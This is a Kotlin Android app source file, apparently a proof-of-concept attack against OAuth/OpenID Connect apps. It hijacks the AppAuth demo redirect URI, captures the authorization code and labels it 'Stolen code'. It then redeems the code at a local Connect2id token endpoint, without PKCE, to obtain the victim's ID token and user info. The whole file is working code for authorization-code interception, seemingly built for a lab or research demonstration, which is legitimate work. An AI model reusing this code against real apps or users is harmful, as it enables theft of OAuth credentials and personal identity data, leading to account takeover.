package com.example.appauth_attack

import android.content.Context
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.widget.TextView
import android.widget.Toast
import androidx.loader.app.LoaderManager
import androidx.loader.content.Loader
import com.google.gson.GsonBuilder
import com.nimbusds.jose.JWSObject
import com.nimbusds.oauth2.sdk.AuthorizationCode
import com.nimbusds.oauth2.sdk.AuthorizationCodeGrant
import com.nimbusds.oauth2.sdk.ParseException
import com.nimbusds.oauth2.sdk.TokenRequest
import com.nimbusds.oauth2.sdk.id.ClientID
import com.nimbusds.oauth2.sdk.token.BearerAccessToken
import com.nimbusds.openid.connect.sdk.OIDCTokenResponse
import com.nimbusds.openid.connect.sdk.OIDCTokenResponseParser
import com.nimbusds.openid.connect.sdk.UserInfoRequest
import com.nimbusds.openid.connect.sdk.UserInfoResponse
import java.net.URI
import androidx.loader.content.AsyncTaskLoader as AsyncTaskLoader

class MainActivity : AppCompatActivity(), LoaderManager.LoaderCallbacks<MainActivity.Response> {

    val CLIENT_ID = "vmgmkqxeq3mzy"

    var codeStr = ""
    lateinit var loaderManager: LoaderManager

    lateinit var idTokenView: TextView
    lateinit var userInfoEndpointView: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val codeView = findViewById<TextView>(R.id.code)
        idTokenView = findViewById<TextView>(R.id.idToken)
        userInfoEndpointView = findViewById<TextView>(R.id.userInfoEndpoint)

        loaderManager = LoaderManager.getInstance(this)

        val uri: Uri? = intent.data
        if (uri != null) {
            codeStr = uri.getQueryParameter("code")!!
            println("Code: ${codeStr}")
            codeView.text = "Stolen code:\n${codeStr}"

            val loaderCallbacks: LoaderManager.LoaderCallbacks<Response> = this
            val loader = loaderManager.initLoader(0, null, loaderCallbacks)
            loader.forceLoad()
        }
    }

    override fun onCreateLoader(id: Int, args: Bundle?): Loader<Response> {
        return MyLoader(this, codeStr, CLIENT_ID)
    }

    override fun onLoadFinished(loader: Loader<Response>, data: Response?) {
        println("On load finished: $data")

        if (data != null && data.error == "") {
            idTokenView.text = "ID Token:\n${data.idToken}"
            userInfoEndpointView.text = "User Info Endpoint:\n${data.userInfoResponse}"
        } else {
            Toast.makeText(this, data?.error, Toast.LENGTH_SHORT).show()
        }
    }

    override fun onLoaderReset(loader: Loader<Response>) {
        TODO("Not yet implemented")
    }

    class MyLoader(context: Context, val codeStr: String, val clientIdStr: String): AsyncTaskLoader<Response>(context) {

        override fun loadInBackground(): Response? {
            val code = AuthorizationCode(codeStr)
            val callback = URI("net.openid.appauthdemo:/oauth2redirect")
            val codeGrant = AuthorizationCodeGrant(code, callback)

            val clientID = ClientID(clientIdStr)

            val tokenEndpoint = URI("http://c2id.local:8080/c2id/token")

            val request = TokenRequest(tokenEndpoint, clientID, codeGrant)
            val tokenResponse = OIDCTokenResponseParser.parse(request.toHTTPRequest().send())

            if (!tokenResponse.indicatesSuccess()) {
                val errorResponse = tokenResponse.toErrorResponse()
                println("Error getting ID Token: ${errorResponse.toJSONObject()}")
                return Response(error = "Error getting ID Token")
            }

            val successResponse: OIDCTokenResponse = tokenResponse.toSuccessResponse() as OIDCTokenResponse

            val accessToken = successResponse.oidcTokens.accessToken
            val idToken = successResponse.oidcTokens.idTokenString

            val userInfoEndpoint = URI("http://c2id.local:8080/c2id/userinfo")
            val token = BearerAccessToken(accessToken.toString())

            val response = UserInfoRequest(userInfoEndpoint, token).toHTTPRequest().send()

            val userInfoResponse = UserInfoResponse.parse(response)

            if (!userInfoResponse.indicatesSuccess()) {
                println("Error on the user info endpoint")
                return Response(error = "Error on the user info endpoint")
            }

            val idTokenJSON = userInfoResponse.toSuccessResponse().userInfo.toJSONObject()

            val gson = GsonBuilder().setPrettyPrinting().create()
            return Response(idToken = idToken, userInfoResponse = gson.toJson(idTokenJSON))
        }

        // start loading
        override fun onStartLoading() { }

    }

    data class Response(val idToken: String = "", val userInfoResponse: String = "", val error: String = "")

}
